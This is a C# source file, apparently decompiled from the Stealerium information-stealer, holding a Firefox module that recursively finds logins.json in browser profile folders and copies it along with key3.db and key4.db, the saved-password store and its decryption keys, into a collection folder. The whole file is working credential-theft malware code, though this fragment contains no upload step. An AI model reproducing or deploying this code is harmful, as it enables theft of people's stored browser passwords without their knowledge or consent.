using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Firefox;

internal sealed class CLogins
{
	private static readonly string[] KeyFiles = new string[3] { "key3.db", "key4.db", "logins.json" };

	private static void CopyDatabaseFile(string from, string sSavePath)
	{
		try
		{
			if (File.Exists(from))
			{
				File.Copy(from, sSavePath + "\\" + Path.GetFileName(from));
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Firefox >> Failed to copy logins\n" + ex);
		}
	}

	public static bool GetDbFiles(string path, string sSavePath)
	{
		if (!Directory.Exists(path))
		{
			return false;
		}
		string[] files = Directory.GetFiles(path, "logins.json", SearchOption.AllDirectories);
		foreach (string path2 in files)
		{
			string[] keyFiles = KeyFiles;
			foreach (string path3 in keyFiles)
			{
				CopyDatabaseFile(Path.Combine(Path.GetDirectoryName(path2), path3), sSavePath);
			}
		}
		return true;
	}
}
